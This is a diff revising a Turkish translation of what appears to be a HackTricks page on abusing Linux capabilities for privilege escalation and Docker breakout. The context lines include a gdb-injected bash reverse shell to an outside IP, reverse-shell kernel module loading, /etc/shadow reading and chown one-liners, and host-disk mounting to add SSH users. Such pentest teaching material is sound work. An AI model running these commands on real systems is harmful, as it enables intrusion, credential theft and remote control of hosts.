@@ -15,7 +15,7 @@ Linux yetenekleri **root ayrıcalıklarını daha küçük, belirgin birimlere**
 1. **Miras Alınan (CapInh)**:
 
 - **Amaç**: Ebeveyn süreçten devredilen yetenekleri belirler.
-- **Fonksiyon**: Yeni bir süreç oluşturulduğunda, bu setten ebeveyninden yetenekleri miras alır. Süreç oluşturma sırasında belirli ayrıcalıkları korumak için yararlıdır.
+- **Fonksiyon**: Yeni bir süreç oluşturulduğunda, bu setten ebeveyninden yetenekleri miras alır. Süreç oluşturma sırasında belirli ayrıcalıkları korumak için faydalıdır.
 - **Kısıtlamalar**: Bir süreç, ebeveyninin sahip olmadığı yetenekleri kazanamaz.
 
 2. **Etkin (CapEff)**:
@@ -33,13 +33,13 @@ Linux yetenekleri **root ayrıcalıklarını daha küçük, belirgin birimlere**
 4. **Sınırlandırıcı (CapBnd)**:
 
 - **Amaç**: Bir sürecin yaşam döngüsü boyunca edinebileceği yetenekler üzerinde bir tavan koyar.
-- **Fonksiyon**: Bir süreç, miras alınan veya izinli setinde belirli bir yeteneğe sahip olsa bile, o yeteneği yalnızca sınırlandırıcı setinde de varsa edinebilir.
-- **Kullanım Durumu**: Bu set, bir sürecin ayrıcalık yükseltme potansiyelini kısıtlamak için özellikle yararlıdır ve ek bir güvenlik katmanı ekler.
+- **Fonksiyon**: Bir süreç, miras alınabilir veya izinli setinde belirli bir yeteneğe sahip olsa bile, o yeteneği yalnızca sınırlandırıcı setinde de varsa edinebilir.
+- **Kullanım durumu**: Bu set, bir sürecin ayrıcalık yükseltme potansiyelini kısıtlamak için özellikle faydalıdır ve ek bir güvenlik katmanı ekler.
 
 5. **Ortam (CapAmb)**:
 - **Amaç**: Belirli yeteneklerin, genellikle sürecin yeteneklerinin tamamen sıfırlanmasına neden olacak bir `execve` sistem çağrısı sırasında korunmasına olanak tanır.
-- **Fonksiyon**: İlişkili dosya yetenekleri olmayan SUID olmayan programların belirli ayrıcalıkları korumasını sağlar.
-- **Kısıtlamalar**: Bu set içindeki yetenekler, miras alınan ve izinli setlerin kısıtlamalarına tabidir, böylece sürecin izin verilen ayrıcalıklarını aşmazlar.
+- **Fonksiyon**: İlgili dosya yeteneklerine sahip olmayan SUID olmayan programların belirli ayrıcalıkları korumasını sağlar.
+- **Kısıtlamalar**: Bu set içindeki yetenekler, miras alınabilir ve izinli setlerin kısıtlamalarına tabidir, böylece sürecin izin verilen ayrıcalıklarını aşmazlar.
 ```python
 # Code to demonstrate the interaction of different capability sets might look like this:
 # Note: This is pseudo-code for illustrative purposes only.
@@ -59,11 +59,11 @@ Daha fazla bilgi için kontrol edin:
 ### Süreçler Yetenekleri
 
 Belirli bir süreç için yetenekleri görmek için /proc dizinindeki **status** dosyasını kullanın. Daha fazla ayrıntı sağladığı için, bunu yalnızca Linux yetenekleri ile ilgili bilgilere sınırlayalım.\
-Tüm çalışan süreçler için yetenek bilgisi her bir iş parçacığı başına korunur, dosya sistemindeki ikili dosyalar için ise genişletilmiş niteliklerde saklanır.
+Tüm çalışan süreçler için yetenek bilgisi her bir iş parçacığı için korunur, dosya sistemindeki ikili dosyalar için ise genişletilmiş niteliklerde saklanır.
 
-/usr/include/linux/capability.h dosyasında tanımlanan yetenekleri bulabilirsiniz.
+Yetenekleri /usr/include/linux/capability.h dosyasında bulabilirsiniz.
 
-Mevcut sürecin yeteneklerini `cat /proc/self/status` komutunu kullanarak veya `capsh --print` komutunu çalıştırarak ve diğer kullanıcıların yeteneklerini `/proc/<pid>/status` dosyasında bulabilirsiniz.
+Mevcut sürecin yeteneklerini `cat /proc/self/status` komutuyla veya `capsh --print` komutunu kullanarak ve diğer kullanıcıların yeteneklerini `/proc/<pid>/status` dosyasında bulabilirsiniz.
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
@@ -100,11 +100,11 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-Çalışsa da, başka ve daha kolay bir yol var. Çalışan bir sürecin yeteneklerini görmek için, **getpcaps** aracını kullanarak ardından süreç kimliğini (PID) yazın. Ayrıca bir süreç kimliği listesi de verebilirsiniz.
+Çalışsa da, başka ve daha kolay bir yol var. Çalışan bir sürecin yeteneklerini görmek için, **getpcaps** aracını kullanarak ardından süreç kimliğini (PID) yazmanız yeterlidir. Ayrıca bir süreç kimliği listesi de verebilirsiniz.
 ```bash
 getpcaps 1234
 ```
-Burada `tcpdump`'ın yeteneklerini kontrol edelim, ikili dosyaya yeterli yetenekler (`cap_net_admin` ve `cap_net_raw`) verildikten sonra ağı dinlemek için (_tcpdump işlem 9562'de çalışıyor_):
+Burada `tcpdump`'ın yeteneklerini kontrol edelim, ikili dosyaya yeterli yetenekler (`cap_net_admin` ve `cap_net_raw`) verildikten sonra ağ dinlemek için (_tcpdump işlem 9562'de çalışıyor_):
 ```bash
 #The following command give tcpdump the needed capabilities to sniff traffic
 $ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
@@ -122,7 +122,7 @@ CapAmb:    0000000000000000
 $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-Verilen yeteneklerin, bir ikili dosyanın yeteneklerini elde etmenin 2 yolu ile elde edilen sonuçlarla eşleştiğini görebilirsiniz.\
+Verilen yeteneklerin, bir ikili dosyanın yeteneklerini elde etmenin 2 yolu ile elde edilen sonuçlarla örtüştüğünü görebilirsiniz.\
 _getpcaps_ aracı, belirli bir iş parçacığı için mevcut yetenekleri sorgulamak üzere **capget()** sistem çağrısını kullanır. Bu sistem çağrısı, daha fazla bilgi almak için yalnızca PID sağlamayı gerektirir.
 
 ### İkili Dosyaların Yetenekleri
@@ -132,7 +132,7 @@ _getpcaps_ aracı, belirli bir iş parçacığı için mevcut yetenekleri sorgul
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
-**Yeteneklere sahip ikili dosyaları aramak için:**
+Yetkileri olan **ikili dosyaları aramak için** şunu kullanabilirsiniz:
 ```bash
 getcap -r / 2>/dev/null
 ```
@@ -148,7 +148,7 @@ _bash_ çıktısının yanı sıra, _tcpdump_ komutu da bir hata vermelidir.
 
 Hata, ping komutunun bir ICMP soketi açmasına izin verilmediğini açıkça gösteriyor. Artık bunun beklendiği gibi çalıştığını kesin olarak biliyoruz.
 
-### Yetenekleri Kaldırma
+### Yetenekleri Kaldır
 
 Bir ikili dosyanın yeteneklerini kaldırabilirsiniz.
 ```bash
@@ -276,7 +276,7 @@ capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 > [!CAUTION]
-> Sadece **hem izin verilen hem de miras alınan** setlerde bulunan yetenekleri ekleyebilirsiniz.
+> Sadece **hem izin verilen hem de miras alınan setlerde bulunan** yetenekler ekleyebilirsiniz.
 
 ### Yetenek farkında/Yetenek cahil ikili dosyalar
 
@@ -285,7 +285,7 @@ Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ## Servis Yetenekleri
 
 Varsayılan olarak, **root olarak çalışan bir servis tüm yetenekleri atamış olacaktır**, ve bazı durumlarda bu tehlikeli olabilir.\
-Bu nedenle, bir **servis yapılandırma** dosyası, sahip olmasını istediğiniz **yetenekleri** **belirlemenize** ve servisi çalıştıracak **kullanıcıyı** tanımlamanıza olanak tanır; böylece gereksiz ayrıcalıklara sahip bir servis çalıştırmaktan kaçınılır:
+Bu nedenle, **bir servis yapılandırma** dosyası, **istediğiniz yetenekleri** belirtmenize ve servisi çalıştıracak **kullanıcıyı** tanımlamanıza olanak tanır, böylece gereksiz ayrıcalıklara sahip bir servis çalıştırmaktan kaçınılır:
 ```bash
 [Service]
 User=bob
@@ -321,7 +321,7 @@ setcap cap_net_raw+ep /sbin/ping
 getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
-`+ep` demek, yeteneği ("-" bunu kaldırır) Etkili ve İzinli olarak ekliyorsunuz.
+`+ep` demek, yeteneği ( "-" bunu kaldırır) Etkili ve İzinli olarak ekliyorsunuz.
 
 Bir sistemde veya klasörde yeteneklere sahip programları tanımlamak için:
 ```bash
@@ -345,7 +345,7 @@ getcap /usr/sbin/tcpdump
 ```
 ### "Boş" yeteneklerin özel durumu
 
-[Belgelerden](https://man7.org/linux/man-pages/man7/capabilities.7.html): Boş yetenek setlerinin bir program dosyasına atanabileceğini unutmayın, bu nedenle etkili ve kaydedilmiş set-kullanıcı-ID'sini 0 olarak değiştiren bir set-user-ID-root programı oluşturmak mümkündür, ancak bu sürece hiçbir yetenek kazandırmaz. Ya da basitçe ifade etmek gerekirse, eğer bir ikili dosyanız varsa:
+[Belgelerden](https://man7.org/linux/man-pages/man7/capabilities.7.html): Boş yetenek setlerinin bir program dosyasına atanabileceğini unutmayın, bu nedenle etkili ve kaydedilmiş set-user-ID'sini 0 olarak değiştiren bir set-user-ID-root programı oluşturmak mümkündür, ancak bu süreçte o işleme hiçbir yetenek verilmez. Ya da basitçe ifade etmek gerekirse, eğer bir ikili dosyanız varsa:
 
 1. root tarafından sahiplenilmemiş
 2. `SUID`/`SGID` bitleri ayarlanmamış
@@ -355,7 +355,7 @@ o zaman **o ikili dosya root olarak çalışacaktır**.
 
 ## CAP_SYS_ADMIN
 
-**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, geniş **idari ayrıcalıkları** nedeniyle genellikle neredeyse root seviyesine eşitlenen son derece güçlü bir Linux yeteneğidir; örneğin cihazları monte etme veya çekirdek özelliklerini manipüle etme gibi. Tüm sistemleri simüle eden konteynerler için vazgeçilmez olsa da, **`CAP_SYS_ADMIN` önemli güvenlik zorlukları** ortaya çıkarır, özellikle ayrıcalık yükseltme ve sistemin tehlikeye atılma potansiyeli nedeniyle konteynerleştirilmiş ortamlarda. Bu nedenle, kullanımı sıkı güvenlik değerlendirmeleri ve dikkatli yönetim gerektirir; uygulama özel konteynerlerde bu yeteneğin bırakılması, **en az ayrıcalık ilkesi** ile uyum sağlamak ve saldırı yüzeyini en aza indirmek için güçlü bir tercih olmalıdır.
+**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, geniş **idari ayrıcalıkları** nedeniyle genellikle neredeyse root seviyesine eşitlenen son derece güçlü bir Linux yeteneğidir; örneğin, cihazları monte etme veya çekirdek özelliklerini manipüle etme gibi. Tüm sistemleri simüle eden konteynerler için vazgeçilmez olsa da, **`CAP_SYS_ADMIN` önemli güvenlik zorlukları** ortaya çıkarır, özellikle ayrıcalık yükseltme ve sistemin tehlikeye atılma potansiyeli nedeniyle konteynerleştirilmiş ortamlarda. Bu nedenle, kullanımı sıkı güvenlik değerlendirmeleri ve dikkatli yönetim gerektirir; uygulama özel konteynerlerde bu yeteneğin bırakılması, **en az ayrıcalık ilkesi** ile uyum sağlamak ve saldırı yüzeyini en aza indirmek için güçlü bir tercih olmalıdır.
 
 **İkili ile örnek**
 ```bash
@@ -417,7 +417,7 @@ chroot ./ bash #You have a shell inside the docker hosts disk
 - **Tam erişim**
 
 Önceki yöntemde docker ana bilgisayar diskine erişmeyi başardık.\
-Eğer ana bilgisayarın bir **ssh** sunucusu çalıştığını bulursanız, **docker ana bilgisayar** diskinde bir kullanıcı oluşturabilir ve buna SSH ile erişebilirsiniz:
+Eğer ana bilgisayarın bir **ssh** sunucusu çalıştırdığını bulursanız, **docker ana bilgisayar** diskinde bir kullanıcı oluşturabilir ve SSH üzerinden erişebilirsiniz:
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -433,9 +433,9 @@ ssh john@172.17.0.1 -p 2222
 ```
 ## CAP_SYS_PTRACE
 
-**Bu, ana makinede çalışan bir süreç içine shellcode enjekte ederek konteynerden çıkabileceğiniz anlamına gelir.** Ana makinede çalışan süreçlere erişmek için konteynerin en az **`--pid=host`** ile çalıştırılması gerekir.
+**Bu, bir shellcode'u ana makinede çalışan bir süreç içine enjekte ederek konteynerden çıkabileceğiniz anlamına gelir.** Ana makinede çalışan süreçlere erişmek için konteynerin en azından **`--pid=host`** ile çalıştırılması gerekir.
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** `ptrace(2)` tarafından sağlanan hata ayıklama ve sistem çağrısı izleme işlevlerini kullanma yeteneğini ve `process_vm_readv(2)` ve `process_vm_writev(2)` gibi bellekler arası ekleme çağrılarını kullanma yeteneğini verir. Hata ayıklama ve izleme amaçları için güçlü olmasına rağmen, `CAP_SYS_PTRACE` kısıtlayıcı önlemler olmadan, örneğin `ptrace(2)` üzerinde bir seccomp filtresi olmadan etkinleştirildiğinde, sistem güvenliğini önemli ölçüde zayıflatabilir. Özellikle, diğer güvenlik kısıtlamalarını, özellikle seccomp tarafından dayatılanları aşmak için kullanılabilir, bu da [bu tür kanıtlar (PoC) ile gösterilmiştir](https://gist.github.com/thejh/8346f47e359adecd1d53).
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** `ptrace(2)` tarafından sağlanan hata ayıklama ve sistem çağrısı izleme işlevlerini kullanma yeteneğini ve `process_vm_readv(2)` ve `process_vm_writev(2)` gibi bellekler arası ekleme çağrılarını sağlar. Hata ayıklama ve izleme amaçları için güçlü olmasına rağmen, `CAP_SYS_PTRACE` kısıtlayıcı önlemler olmadan, örneğin `ptrace(2)` üzerinde bir seccomp filtresi olmadan etkinleştirildiğinde, sistem güvenliğini önemli ölçüde zayıflatabilir. Özellikle, diğer güvenlik kısıtlamalarını, özellikle seccomp tarafından dayatılanları aşmak için sömürülebilir; bu, [bu tür kanıtlar (PoC) ile gösterilmiştir](https://gist.github.com/thejh/8346f47e359adecd1d53).
 
 **Binary ile örnek (python)**
 ```bash
@@ -584,14 +584,14 @@ process 207009 is executing new program: /usr/bin/dash
 ```
 **Örnek ile ortam (Docker breakout) - Başka bir gdb Suistimali**
 
-Eğer **GDB** yüklüyse (veya `apk add gdb` veya `apt install gdb` ile yükleyebilirsiniz) **host'tan bir süreci debug'layabilir** ve `system` fonksiyonunu çağırmasını sağlayabilirsiniz. (Bu teknik ayrıca `SYS_ADMIN` yetkisini de gerektirir)**.**
+Eğer **GDB** yüklüyse (veya `apk add gdb` veya `apt install gdb` ile yükleyebilirsiniz) **bir süreci ana makineden hata ayıklayabilir** ve `system` fonksiyonunu çağırmasını sağlayabilirsiniz. (Bu teknik ayrıca `SYS_ADMIN` yetkisini de gerektirir)**.**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
 (gdb) call (void)system("sleep 5")
 (gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
 ```
-Komutun çıktısını göremeyeceksiniz ama bu işlem tarafından yürütülecektir (bu yüzden bir rev shell alın).
+Komutun çıktısını göremeyeceksiniz ama bu işlem tarafından yürütülecek (yani bir rev shell alın).
 
 > [!WARNING]
 > "No symbol "system" in current context." hatasını alırsanız, gdb aracılığıyla bir programda shellcode yükleyen önceki örneği kontrol edin.
@@ -621,11 +621,12 @@ List **processes** running in the **host** `ps -eaf`
 
 ## CAP_SYS_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bir sürece **kernel modüllerini yükleme ve kaldırma (`init_module(2)`, `finit_module(2)` ve `delete_module(2)` sistem çağrıları)** yetkisi verir, bu da çekirdeğin temel işlemlerine doğrudan erişim sağlar. Bu yetenek, çekirdekte değişiklik yaparak tüm Linux güvenlik mekanizmalarını, Linux Güvenlik Modülleri ve konteyner izolasyonu dahil olmak üzere, atlatma imkanı sunduğundan kritik güvenlik riskleri taşır. **Bu, ana makinenin çekirdeğine kernel modüllerini ekleyip/çıkarabileceğiniz anlamına gelir.**
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bir sürece **kernel modüllerini yükleme ve kaldırma (`init_module(2)`, `finit_module(2)` ve `delete_module(2)` sistem çağrıları)** yetkisi verir, bu da çekirdeğin temel işlemlerine doğrudan erişim sağlar. Bu yetenek, çekirdekte değişiklik yaparak tüm Linux güvenlik mekanizmalarını, Linux Güvenlik Modülleri ve konteyner izolasyonu dahil olmak üzere, atlayarak ayrıcalık yükseltme ve toplam sistem tehlikesi oluşturma riski taşır.  
+**Bu, **host makinesinin çekirdeğine kernel modüllerini ekleyip/çıkarabileceğiniz anlamına gelir.**
 
 **Example with binary**
 
-Aşağıdaki örnekte, **`python`** adlı ikili dosya bu yetkiye sahiptir.
+Aşağıdaki örnekte **`python`** ikilisi bu yetkiye sahiptir.
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
@@ -640,7 +641,7 @@ Sonra **aşağıda bulabileceğiniz 2 örneği derleyin ve** bunu bu klasöre ko
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
-Sonunda, bu çekirdek modülünü yüklemek için gerekli python kodunu çalıştırın:
+Son olarak, bu çekirdek modülünü yüklemek için gerekli python kodunu çalıştırın:
 ```python
 import kmod
 km = kmod.Kmod()
@@ -671,9 +672,9 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Önceki çıktıda **SYS_MODULE** yetkisinin etkin olduğunu görebilirsiniz.
+İlk önce, **SYS_MODULE** yetkisinin etkin olduğunu görebilirsiniz.
 
-**Ters shell** çalıştıracak **kernel modülünü** ve bunu **derlemek** için **Makefile**'ı **oluşturun**:
+**Ters shell** çalıştıracak **kernel modülünü** ve onu **derlemek** için **Makefile**'ı oluşturun:
 ```c:reverse-shell.c
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -731,12 +732,12 @@ Bu tekniğin bir başka örneği [https://www.cyberark.com/resources/threat-rese
 
 ## CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html), bir sürecin **dosyaları okuma ve dizinleri okuma ve yürütme izinlerini atlamasını** sağlar. Temel kullanımı dosya arama veya okuma amaçlıdır. Ancak, aynı zamanda bir sürecin `open_by_handle_at(2)` fonksiyonunu kullanmasına da izin verir; bu fonksiyon, sürecin montaj ad alanının dışındaki dosyalar da dahil olmak üzere herhangi bir dosyaya erişebilir. `open_by_handle_at(2)`'de kullanılan tanıtıcı, `name_to_handle_at(2)` aracılığıyla elde edilen şeffaf olmayan bir tanımlayıcı olmalıdır, ancak inode numaraları gibi manipülasyona açık hassas bilgileri içerebilir. Bu yetkinin kötüye kullanılma potansiyeli, özellikle Docker konteynerleri bağlamında, Sebastian Krahmer tarafından şok edici bir istismar ile gösterilmiştir; bu konu [burada](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analiz edilmiştir.  
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html), bir sürecin **dosyaları okuma ve dizinleri okuma ve yürütme izinlerini atlamasını** sağlar. Temel kullanımı dosya arama veya okuma amaçlıdır. Ancak, aynı zamanda bir sürecin `open_by_handle_at(2)` fonksiyonunu kullanmasına da izin verir; bu fonksiyon, sürecin montaj ad alanının dışındaki dosyalar da dahil olmak üzere herhangi bir dosyaya erişebilir. `open_by_handle_at(2)`'de kullanılan tanıtıcı, `name_to_handle_at(2)` aracılığıyla elde edilen şeffaf olmayan bir tanımlayıcı olmalıdır, ancak değiştirmeye karşı savunmasız olan inode numaraları gibi hassas bilgileri içerebilir. Bu yetkinin kötüye kullanılma potansiyeli, özellikle Docker konteynerleri bağlamında, Sebastian Krahmer tarafından şok edici bir istismar ile gösterilmiştir; bu konu [burada](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analiz edilmiştir.  
 **Bu, dosya okuma izin kontrollerini ve dizin okuma/yürütme izin kontrollerini atlayabileceğiniz anlamına gelir.**
 
 **İkili ile örnek**
 
-İkili, herhangi bir dosyayı okuyabilecektir. Yani, eğer tar gibi bir dosya bu yetkiye sahipse, gölge dosyasını okuyabilecektir:
+İkili, herhangi bir dosyayı okuyabilecektir. Yani, eğer bir tar dosyası bu yetkiye sahipse, gölge dosyasını okuyabilecektir:
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
@@ -745,14 +746,14 @@ tar -cxf shadow.tar.gz
 ```
 **Binary2 ile Örnek**
 
-Bu durumda **`python`** ikili dosyasının bu yetkiye sahip olduğunu varsayalım. Root dosyalarını listelemek için şunu yapabilirsiniz:
+Bu durumda, **`python`** ikili dosyasının bu yetkiye sahip olduğunu varsayalım. Kök dosyalarını listelemek için şunu yapabilirsiniz:
 ```python
 import os
 for r, d, f in os.walk('/root'):
 for filename in f:
 print(filename)
 ```
-Bir dosyayı okumak için şunları yapabilirsiniz:
+Ve bir dosyayı okumak için şunu yapabilirsiniz:
 ```python
 print(open("/etc/shadow", "r").read())
 ```
@@ -936,7 +937,7 @@ return 0;
 
 **Bu, herhangi bir dosya üzerindeki yazma izin kontrollerini atlayabileceğiniz anlamına gelir, böylece herhangi bir dosyayı yazabilirsiniz.**
 
-Yetkileri artırmak için **üzerine yazabileceğiniz birçok dosya vardır,** [**buradan fikir alabilirsiniz**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+Yetkileri artırmak için **üzerine yazabileceğiniz birçok dosya var,** [**buradan fikir alabilirsiniz**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
 **Binary ile örnek**
 
@@ -970,8 +971,8 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Öncelikle, ev sahibinin rastgele dosyalarını okumak için [**DAC_READ_SEARCH yetkisini kötüye kullanan**](linux-capabilities.md#cap_dac_read_search) önceki bölümü okuyun ve **istismarı derleyin**.\
-Ardından, ev sahibinin dosya sistemine **rastgele dosyalar yazmanıza** olanak tanıyacak **şok edici istismarın aşağıdaki sürümünü derleyin**:
+Öncelikle, ev sahibinin rastgele dosyaları okumak için [**DAC_READ_SEARCH yeteneğini kötüye kullanan**](linux-capabilities.md#cap_dac_read_search) önceki bölümü okuyun ve **istismarı derleyin**.\
+Ardından, ev sahibinin dosya sisteminin içine **rastgele dosyalar yazmanıza** olanak tanıyacak **şok edici istismarın aşağıdaki sürümünü derleyin**:
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1110,9 +1111,9 @@ close(fd1);
 return 0;
 }
 ```
-Docker konteynerinden çıkmak için, ana bilgisayardan `/etc/shadow` ve `/etc/passwd` dosyalarını **indirmek**, bunlara **yeni bir kullanıcı** eklemek ve **`shocker_write`** kullanarak bunları üzerine yazmak gerekir. Ardından, **ssh** üzerinden **erişim** sağlanır.
+Docker konteynerinden çıkmak için, ana bilgisayardan `/etc/shadow` ve `/etc/passwd` dosyalarını **indirmek**, bunlara **yeni bir kullanıcı** eklemek ve **`shocker_write`** kullanarak üzerlerini yazmak gerekebilir. Ardından, **ssh** üzerinden **erişim** sağlanabilir.
 
-**Bu tekniğin kodu,** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **adresindeki "Abusing DAC_OVERRIDE Capability" laboratuvarından kopyalanmıştır.**
+**Bu tekniğin kodu,** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **adresindeki "DAC_OVERRIDE Yetkisini Kötüye Kullanma" laboratuvarından kopyalanmıştır.**
 
 ## CAP_CHOWN
 
@@ -1120,11 +1121,11 @@ Docker konteynerinden çıkmak için, ana bilgisayardan `/etc/shadow` ve `/etc/p
 
 **İkili ile örnek**
 
-Diyelim ki **`python`** ikilisi bu yetkiye sahip, **shadow** dosyasının **sahibini** **değiştirebilir**, **root şifresini** **değiştirebilir** ve ayrıcalıkları artırabilirsiniz:
+Diyelim ki **`python`** ikilisi bu yetkiye sahip, **shadow** dosyasının **sahibini** **değiştirebilir**, **root şifresini** **değiştirebilir** ve yetkileri artırabilirsiniz:
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
-Ya da **`ruby`** ikili dosyasının bu yetkiye sahip olması:
+Veya **`ruby`** ikili dosyasının bu yetkiye sahip olması:
 ```bash
 ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
@@ -1144,7 +1145,7 @@ python -c 'import os;os.chmod("/etc/shadow",0666)
 
 **İkili ile örnek**
 
-Eğer python bu **yetkiye** sahipse, bunu kök yetkilerine yükseltmek için çok kolay bir şekilde kötüye kullanabilirsiniz:
+Eğer python bu **yetkiye** sahipse, bunu kök yetkilerine yükselmek için çok kolay bir şekilde kötüye kullanabilirsiniz:
 ```python
 import os
 os.setuid(0)
@@ -1186,7 +1187,7 @@ Bu durumda grup shadow taklit edildi, böylece `/etc/shadow` dosyasını okuyabi
 ```bash
 cat /etc/shadow
 ```
-Eğer **docker** yüklüyse, **docker grubunu** taklit edebilir ve bunu [**docker soketi** ile iletişim kurmak ve ayrıcalıkları artırmak](./#writable-docker-socket) için kötüye kullanabilirsiniz.
+Eğer **docker** yüklüyse, **docker grubunu** taklit edebilir ve [**docker soketi** ile iletişim kurmak ve ayrıcalıkları artırmak](./#writable-docker-socket) için bunu kötüye kullanabilirsiniz.
 
 ## CAP_SETFCAP
 
@@ -1222,9 +1223,9 @@ print (cap + " was successfully added to " + path)
 python setcapability.py /usr/bin/python2.7
 ```
 > [!WARNING]
-> CAP_SETFCAP ile ikili dosyaya yeni bir yetki ayarlarsanız, bu yetkiyi kaybedeceğinizi unutmayın.
+> Yeni bir yetkiyi CAP_SETFCAP ile ikili dosyaya ayarlarsanız, bu yetkiyi kaybedeceksiniz.
 
-Bir [SETUID yetkisine](linux-capabilities.md#cap_setuid) sahip olduğunuzda, ayrıcalıkları nasıl artıracağınızı görmek için ilgili bölümüne gidebilirsiniz.
+Bir [SETUID yetkisi](linux-capabilities.md#cap_setuid) aldıktan sonra, ayrıcalıkları nasıl artıracağınızı görmek için ilgili bölümüne gidebilirsiniz.
 
 **Ortam ile örnek (Docker breakout)**
 
@@ -1253,13 +1254,13 @@ bash: /usr/bin/gdb: Operation not permitted
 ```
 [From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Bu, bir iş parçacığının üstlenebileceği **etkili yetenekler için sınırlayıcı bir süper kümedir**. Ayrıca, etkili kümesinde **CAP_SETPCAP** yeteneğine sahip olmayan bir iş parçacığı tarafından miras alınabilir kümeye eklenebilecek yetenekler için de sınırlayıcı bir süper kümedir._\
 Görünüşe göre, İzin verilen yetenekler kullanılabilecek olanları sınırlar.\
-Ancak, Docker varsayılan olarak **CAP_SETPCAP** verir, bu nedenle **miras alınabilir olanların içine yeni yetenekler ayarlayabilirsiniz**.\
+Ancak, Docker varsayılan olarak **CAP_SETPCAP** yeteneğini de verir, bu nedenle **miras alınabilir olanların içine yeni yetenekler ekleyebilirsin**.\
 Ancak, bu yeteneğin belgelerinde: _CAP_SETPCAP : \[…] **çağrılan iş parçacığının sınırlayıcı** kümesinden miras alınabilir kümesine herhangi bir yetenek ekler_.\
-Görünüşe göre, yalnızca sınırlayıcı kümeden miras alınabilir küme yeteneklerine ekleme yapabiliyoruz. Bu, **yeni yetenekler, örneğin CAP_SYS_ADMIN veya CAP_SYS_PTRACE'ı miras kümesine koyamayacağımız** anlamına gelir.
+Görünüşe göre, yalnızca sınırlayıcı kümeden miras alınabilir küme yeteneklerine ekleme yapabiliyoruz. Bu da, **yeni yetenekler olan CAP_SYS_ADMIN veya CAP_SYS_PTRACE'ı miras kümesine ekleyemeyeceğimiz** anlamına geliyor.
 
 ## CAP_SYS_RAWIO
 
-[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `/dev/mem`, `/dev/kmem` veya `/proc/kcore` erişimi, `mmap_min_addr`'ı değiştirme, `ioperm(2)` ve `iopl(2)` sistem çağrılarına erişim ve çeşitli disk komutları dahil olmak üzere bir dizi hassas işlem sağlar. `FIBMAP ioctl(2)` de bu yetenek aracılığıyla etkinleştirilmiştir ve bu, [geçmişte](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) sorunlara neden olmuştur. Man sayfasına göre, bu aynı zamanda sahibine diğer cihazlarda tanımlayıcı olarak `bir dizi cihaz spesifik işlemi gerçekleştirme` yetkisi verir.
+[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `/dev/mem`, `/dev/kmem` veya `/proc/kcore` erişimi, `mmap_min_addr`'ı değiştirme, `ioperm(2)` ve `iopl(2)` sistem çağrılarına erişim ve çeşitli disk komutları dahil olmak üzere bir dizi hassas işlem sağlar. `FIBMAP ioctl(2)` de bu yetenek aracılığıyla etkinleştirilmiştir ve bu, [geçmişte](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) sorunlara neden olmuştur. Man sayfasına göre, bu aynı zamanda sahibine diğer cihazlarda tanımlayıcı bir şekilde `bir dizi cihaz spesifik işlemi gerçekleştirme` yetkisi verir.
 
 Bu, **yetki yükseltme** ve **Docker kırılması** için faydalı olabilir.
 
@@ -1269,7 +1270,7 @@ Bu, **yetki yükseltme** ve **Docker kırılması** için faydalı olabilir.
 
 **İkili ile örnek**
 
-Diyelim ki **`python`** ikilisi bu yeteneğe sahip. Eğer **bir hizmet veya soket yapılandırma** (veya bir hizmetle ilgili herhangi bir yapılandırma dosyası) dosyasını da **değiştirebilirseniz**, onu arka kapı ile değiştirebilir ve ardından o hizmetle ilgili süreci öldürüp yeni yapılandırma dosyasının arka kapınızla çalıştırılmasını bekleyebilirsiniz.
